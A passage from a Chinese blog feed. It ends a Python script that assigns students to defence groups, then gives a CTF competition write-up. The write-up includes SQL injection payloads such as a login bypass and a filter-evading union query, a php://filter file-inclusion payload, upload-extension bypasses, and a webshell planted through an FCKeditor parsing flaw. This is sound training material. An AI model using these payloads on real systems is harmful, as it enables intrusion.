class="keyword">if</span> num&amp;lt;mat[grp1]*<span class="number">100</span>:      <span class="comment">#W组</span></div><div class="line">				num=<span class="number">5</span></div><div class="line">			<span class="keyword">elif</span> num&amp;lt;mat[grp1]*<span class="number">100</span>+mat[grp2]*<span class="number">100</span>:    <span class="comment">#Y组</span></div><div class="line">				num=<span class="number">6</span></div><div class="line">			<span class="keyword">else</span>:                      <span class="comment">#其他组</span></div><div class="line">				num=num-(mat[grp1]*<span class="number">100</span>+mat[grp2]*<span class="number">100</span>)</div><div class="line">				<span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">5</span>):</div><div class="line">					<span class="keyword">if</span> num &amp;lt; mat[k]:</div><div class="line">						num=k</div><div class="line">						<span class="keyword">break</span></div><div class="line">					<span class="keyword">else</span>:</div><div class="line">						num-=mat[k]</div><div class="line">			teach=table.row_values(i+<span class="number">1</span>)[<span class="number">8</span>].encode(<span class="string">"gbk"</span>)</div><div class="line">			teach_num=<span class="number">1</span></div><div class="line">			<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">26</span>):</div><div class="line">				<span class="keyword">if</span> stu[num*<span class="number">26</span>+j][<span class="number">8</span>]==teach:</div><div class="line">					teach_num=teach_num+<span class="number">1</span></div><div class="line">			<span class="keyword">if</span> teach_num&amp;gt;<span class="number">2</span>:</div><div class="line">				<span class="keyword">print</span> <span class="string">"too much same teacher!"</span></div><div class="line">				<span class="keyword">continue</span></div><div class="line">			<span class="keyword">elif</span> teach <span class="keyword">in</span> teacher[num]:</div><div class="line">				<span class="keyword">print</span> <span class="string">"same teacher!"</span></div><div class="line">				<span class="keyword">continue</span></div><div class="line">			<span class="keyword">elif</span> mat[num]==<span class="number">0</span>:</div><div class="line">				<span class="keyword">print</span> <span class="string">"no place!"</span></div><div class="line">				<span class="keyword">continue</span></div><div class="line">			<span class="keyword">else</span>:</div><div class="line">				n=num*<span class="number">26</span>+<span class="number">26</span>-mat[num]</div><div class="line">				<span class="keyword">for</span> k <span class="keyword">in</span> range(ncols<span class="number">-2</span>):</div><div class="line">					stu[n][k]=table.row_values(i+<span class="number">1</span>)[k].encode(<span class="string">"gbk"</span>)</div><div class="line">				stu[n][<span class="number">13</span>]=str(num)</div><div class="line">				mat[num]=mat[num]<span class="number">-1</span></div><div class="line">				<span class="keyword">break</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(nrows<span class="number">-1</span>):</div><div class="line">	<span class="keyword">if</span> key <span class="keyword">not</span> <span class="keyword">in</span> table.row_values(i+<span class="number">1</span>)[<span class="number">4</span>].encode(<span class="string">"gbk"</span>):   <span class="comment">#如果不包含关键字</span></div><div class="line">		s=<span class="number">0</span></div><div class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">7</span>):</div><div class="line">			s+=mat[j]</div><div class="line">		<span class="keyword">while</span> <span class="number">1</span>==<span class="number">1</span>:</div><div class="line">			num=random.randint(<span class="number">0</span>,s<span class="number">-1</span>)</div><div class="line">			<span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">7</span>):</div><div class="line">				<span class="keyword">if</span> num &amp;lt; mat[k]:</div><div class="line">					num=k</div><div class="line">					<span class="keyword">break</span></div><div class="line">				<span class="keyword">else</span>:</div><div class="line">					num-=mat[k]</div><div class="line">			teach=table.row_values(i+<span class="number">1</span>)[<span class="number">8</span>].encode(<span class="string">"gbk"</span>)</div><div class="line">			teach_num=<span class="number">1</span></div><div class="line">			<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">26</span>):</div><div class="line">				<span class="keyword">if</span> stu[num*<span class="number">26</span>+j][<span class="number">8</span>]==teach:</div><div class="line">					teach_num=teach_num+<span class="number">1</span></div><div class="line">			<span class="keyword">if</span> teach_num&amp;gt;<span class="number">2</span>:</div><div class="line">				<span class="keyword">continue</span></div><div class="line">			<span class="keyword">elif</span> teach <span class="keyword">in</span> teacher[num]:</div><div class="line">				<span class="keyword">continue</span></div><div class="line">			<span class="keyword">elif</span> mat[num]==<span class="number">0</span>:</div><div class="line">				<span class="keyword">continue</span></div><div class="line">			<span class="keyword">else</span>:</div><div class="line">				n=num*<span class="number">26</span>+<span class="number">26</span>-mat[num]</div><div class="line">				<span class="keyword">for</span> k <span class="keyword">in</span> range(ncols<span class="number">-2</span>):</div><div class="line">					<span class="keyword">try</span>:</div><div class="line">						stu[n][k]=table.row_values(i+<span class="number">1</span>)[k].encode(<span class="string">"gbk"</span>)</div><div class="line">					<span class="keyword">except</span> AttributeError,e:</div><div class="line">						stu[n][k]=str(int(table.row_values(i+<span class="number">1</span>)[k]))</div><div class="line">				stu[n][<span class="number">13</span>]=str(num)</div><div class="line">				mat[num]=mat[num]<span class="number">-1</span></div><div class="line">				<span class="keyword">break</span></div><div class="line"></div><div class="line">workbook = xlwt.Workbook(encoding = <span class="string">'gbk'</span>)</div><div class="line">worksheet = workbook.add_sheet(<span class="string">'Sheet1'</span>)</div><div class="line"></div><div class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(ncols): </div><div class="line">	worksheet.write(<span class="number">0</span>, j, label = table.row_values(<span class="number">0</span>)[j].encode(<span class="string">"gbk"</span>))</div><div class="line">n=<span class="number">1</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(stu)):</div><div class="line">	<span class="keyword">if</span> <span class="string">'1'</span> <span class="keyword">in</span> stu[i][<span class="number">0</span>]:</div><div class="line">		<span class="comment">#print stu[i][0]</span></div><div class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(ncols+<span class="number">1</span>): </div><div class="line">			worksheet.write(n, j, label = stu[i][j])</div><div class="line">		n+=<span class="number">1</span></div><div class="line"></div><div class="line">workbook.save(<span class="string">'Workbook.xls'</span>)</div><div class="line"><span class="keyword">print</span> <span class="string">"success!"</span></div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;需求分析&quot;&gt;&lt;a href=&quot;#需求分析&quot; class=&quot;headerlink&quot; title=&quot;需求分析&quot;&gt;&lt;/a&gt;需求分析&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;算法集中分在2组，就是W老师和Y老师那两组，&lt;/li&gt;
&lt;li&gt;指导老师不能答辩自己指导的学生。&lt;/li&gt;
&lt;li&gt;&lt;p&gt;每个指导老师的学生最好不要扎堆（小于等于2）&lt;/p&gt;
    
    </summary>
    
    
      <category term="python" scheme="https://www.codemonster.cn/tags/python/"/>
    
      <category term="excel" scheme="https://www.codemonster.cn/tags/excel/"/>
    
      <category term="算法" scheme="https://www.codemonster.cn/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>2017 XMUT第一届网络信息安全大赛 WriteUp</title>
    <link href="https://www.codemonster.cn/2017/05/06/2017-xmut-ctf-writeup/"/>
    <id>https://www.codemonster.cn/2017/05/06/2017-xmut-ctf-writeup/</id>
    <published>2017-05-06T12:51:00.000Z</published>
    <updated>2018-05-04T07:47:50.013Z</updated>
    
    <content type="html"><![CDATA[<p>因为是赛后写的，有部分拿到flag后需要栅栏解密和凯撒解密的我真的忘了，见谅。<br><a id="more"></a></p>
<h2 id="Web1-签到"><a href="#Web1-签到" class="headerlink" title="Web1 签到"></a>Web1 签到</h2><p>右键源代码即可看到flag</p>
<h2 id="Web2-从哪来"><a href="#Web2-从哪来" class="headerlink" title="Web2 从哪来"></a>Web2 从哪来</h2><p>要求从英国访问</p>
<p>抓包，修改http协议头部的<code>Accept-Language</code>为<code>en-GB</code><br>然后提示ip为<code>1.1.1.1</code>，添加<code>X-forwarded-for:1.1.1.1</code> ，提交即可返回flag</p>
<h2 id="Web3-前端！前端！"><a href="#Web3-前端！前端！" class="headerlink" title="Web3 前端！前端！"></a>Web3 前端！前端！</h2><p>右键源代码看到一个eval函数，用浏览器控制台<code>console.log(eval函数中的内容)</code>，即可看到一段源码，输入源码中的密码即可拿到flag</p>
<h2 id="Web4-只有管理员才能拿到flag"><a href="#Web4-只有管理员才能拿到flag" class="headerlink" title="Web4 只有管理员才能拿到flag"></a>Web4 只有管理员才能拿到flag</h2><p>直接访问提示只有管理员可以访问，抓包看到<code>cookie</code>很可疑，base64解码看到user=test;<br>改成<code>user=admin;</code> 再base64加密替换原来的cookie访问页面即可得到flag</p>
<h2 id="Web5-百战天虫"><a href="#Web5-百战天虫" class="headerlink" title="Web5 百战天虫"></a>Web5 百战天虫</h2><p>源代码提示<code>&lt;meta name=&quot;ROBOTS&quot;</code><br>访问<code>robots.txt</code>即可得到密码，回主页输入密码拿到flag</p>
<h2 id="Web6-上传"><a href="#Web6-上传" class="headerlink" title="Web6 上传"></a>Web6 上传</h2><p>随便抓包上传一个图片，返回了flag</p>
<h2 id="Web7-你有密码吗"><a href="#Web7-你有密码吗" class="headerlink" title="Web7 你有密码吗"></a>Web7 你有密码吗</h2><p>右键源码可以看到php源代码，构造万能密码 <code>admin&#39;) or 1=1#</code>，账号密码都输入这个即可返回flag</p>
<h2 id="Web8-注入"><a href="#Web8-注入" class="headerlink" title="Web8 注入"></a>Web8 注入</h2><p>过滤了空格，用<code>/**/</code>来代替，又过滤了union，select ，<code>双写</code>也能绕过，然后猜测flag在flag表的flag字段<br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id=1/**/ununionion/**/seselectlect/**/1,flag/**/from/**/flag</div></pre></td></tr></table></figure></p>
<p>post提交就能拿到flag</p>
<h2 id="Web9-上传，又是上传！"><a href="#Web9-上传，又是上传！" class="headerlink" title="Web9 上传，又是上传！"></a>Web9 上传，又是上传！</h2><p>上传一个jpg后缀的图马，抓包改后缀为<code>pht</code>就能拿到flag</p>
<h2 id="Web10-你懂伪协议吗？"><a href="#Web10-你懂伪协议吗？" class="headerlink" title="Web10 你懂伪协议吗？"></a>Web10 你懂伪协议吗？</h2><p>右键源码可以看到源代码，get的user参数的值为admin时，可以包含file参数的值那个文件，还提示了flag在<code>fla9.php</code>，直接<code>file=fla9.php</code>没有显示，想到用伪协议将fla9的源码base64后包含<br>payload：<code>?user=admin&amp;amp;file=php://filter/read=convert.base64-encode/resource=fla9.php</code><br>得到一串base64，base64解密即可得到flag</p>
<h2 id="Misc1-注意看仔细了"><a href="#Misc1-注意看仔细了" class="headerlink" title="Misc1 注意看仔细了"></a>Misc1 注意看仔细了</h2><p>队友做的，winhex打开图片，flag在最后面</p>
<h2 id="Misc2-密码就在图片上"><a href="#Misc2-密码就在图片上" class="headerlink" title="Misc2 密码就在图片上"></a>Misc2 密码就在图片上</h2><p>唯一一道没做出来的题，<code>f5隐写术</code>，比赛的时候硬是无数次错过那套工具，<br>提示了密码在图片上，图中最显眼的字符为password，<br>用<code>F5-steganography</code> 工具解密即可拿到flag</p>
<p><code>java Extract f5.jpg -p password</code></p>
<h2 id="Misc3-照着题目做"><a href="#Misc3-照着题目做" class="headerlink" title="Misc3 照着题目做"></a>Misc3 照着题目做</h2><p>队友做的，听说照着题目说的点了100次然后拿到flag</p>
<h2 id="Misc4-你不可能拿得到flag"><a href="#Misc4-你不可能拿得到flag" class="headerlink" title="Misc4 你不可能拿得到flag"></a>Misc4 你不可能拿得到flag</h2><p>猜测是<code>zip伪加密</code>，winhex打开可以看到文件头的标记为没有加密，但是却提示输入密码，定位</p>
<p><code>50 4B 01 02</code></p>
<p>压缩源文件目录区：<br>50 4B 01 02：目录中文件文件头标记(0x02014b50)<br>1F 00：压缩使用的 pkware 版本<br>14 00：解压文件所需 pkware 版本<br>09 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）</p>
<p>把这里改成<code>0000</code>保存即可解压，是个二维码，用<code>ps取反</code>后扫描，</p>
<p>提示这里没有flag，winhex打开二维码图片在最后面找到flag</p>
<h2 id="Crypto1-base？"><a href="#Crypto1-base？" class="headerlink" title="Crypto1 base？"></a>Crypto1 base？</h2><p>粘贴到<code>hackbar</code>，一直<code>base64解密</code>几次就看到flag了</p>
<h2 id="Crypto2-你是一名合格的特工吗"><a href="#Crypto2-你是一名合格的特工吗" class="headerlink" title="Crypto2 你是一名合格的特工吗"></a>Crypto2 你是一名合格的特工吗</h2><p><code>摩尔密码</code>解密，得到一串疑似培根密码的东西<br>解密得到<code>thisisflag</code>，加上<code>gctf{}</code>就是flag了</p>
<h2 id="Crypto3-这是什么鬼？"><a href="#Crypto3-这是什么鬼？" class="headerlink" title="Crypto3 这是什么鬼？"></a>Crypto3 这是什么鬼？</h2><p><code>jsfuck</code>，直接粘贴到浏览器控制台就alert弹出flag了</p>
<h2 id="Crypto4-隔壁班妹子的表白"><a href="#Crypto4-隔壁班妹子的表白" class="headerlink" title="Crypto4 隔壁班妹子的表白"></a>Crypto4 隔壁班妹子的表白</h2><p>提示妹子大二，天蝎座好像，是要我们手动输日期爆破，但是队友直接用od打开就看到了flag</p>
<h2 id="综合题"><a href="#综合题" class="headerlink" title="综合题"></a>综合题</h2><p>观察网站，写着TBLOG，没听过，百度有源码但是懒得下载，<br>博客唯一一篇文章提示后台在/admin，访问得到管理员登录页面，下意识输入a<code>dmin admin</code>弱密码登进后台<br>后来发现登陆页面源码里好像也有写密码<br>进后台后观察后台结构，没有数据库备份，没有网站配置，找到一个发布文章的地方，有一个fckeditor编辑器，版本2.6.4.1，找到上传点，一开始各种上传，但是1.php.jpg传上去变成了1_php.jpg，无法达到畸形解析，各种截断也失败了，创建1.php目录也会被过滤成1_php，最后发现上传1.jpg网马后，访问 <code>1.jpg/1.php</code>可以解析php网马，接下来菜刀连接，直接就system权限，在菜刀中查看管理员桌面的<code>flag.txt</code>文件拿到flag</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最后剩一题f5没做出来很难受，没有逆向没有pwn，所以还是拿了第一，奖金1200还是很美滋滋的。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;因为是赛后写的，有部分拿到flag后需要栅栏解密和凯撒解密的我真的忘了，见谅。&lt;br&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
      <category term="Web" scheme="https://www.codemonster.cn/tags/Web/"/>
    
      <category term="Crypto" scheme="https://www.codemonster.cn/tags/Crypto/"/>
    
      <category term="Misc" scheme="https://www.codemonster.cn/tags/Misc/"/>
    
  </entry>
  
</feed>
